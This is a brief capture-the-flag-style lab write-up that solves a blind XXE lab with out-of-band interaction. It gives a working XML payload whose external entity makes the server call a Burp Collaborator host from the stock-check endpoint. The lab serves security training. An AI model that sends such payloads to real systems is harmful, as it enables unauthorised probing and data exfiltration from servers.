# 5. Blind XXE with out-of-band interaction

Goal : solve the Lab using burp collaborator

Steps : 

- we have POST /product/stock HTTP/2
- send this request and solve the Lab :

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://lynrnanaqbdvhmq8oy3a27iraig94zso.oastify.com"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

Lab SOLVED 🙂